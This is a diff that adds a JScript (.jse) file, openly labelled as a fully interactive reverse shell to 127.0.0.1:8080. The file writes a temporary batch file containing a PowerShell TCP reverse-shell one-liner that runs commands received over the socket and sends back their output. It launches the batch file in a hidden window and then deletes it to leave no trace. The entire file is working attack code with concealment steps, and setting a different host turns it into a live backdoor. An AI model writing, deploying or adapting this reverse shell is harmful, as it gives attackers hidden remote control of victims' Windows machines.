@@ -1,0 +1,21 @@
+// rev_interactive.jse - Fully interactive reverse shell to 127.0.0.1:8080
+(function () {
+    var host = "127.0.0.1";
+    var port = 8080;
+    var tmpBat = "%TEMP%\\x.bat";
+
+    // 1. Create temporary batch file that pipes to netcat-like TCP
+    var fs = new ActiveXObject("Scripting.FileSystemObject");
+    var bat = fs.CreateTextFile(tmpBat, true);
+    bat.WriteLine("@echo off");
+    bat.WriteLine("powershell -c \"$client = New-Object Net.Sockets.TcpClient('" + host + "', " + port + "); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object Text.UTF8Encoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::UTF8).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close()\"");
+    bat.Close();
+
+    // 2. Run it hidden
+    var shell = new ActiveXObject("WScript.Shell");
+    shell.Run(tmpBat, 0, false);
+
+    // 3. Clean up after 3 seconds
+    WScript.Sleep(3000);
+    try { fs.DeleteFile(tmpBat); } catch(e) {}
+})();
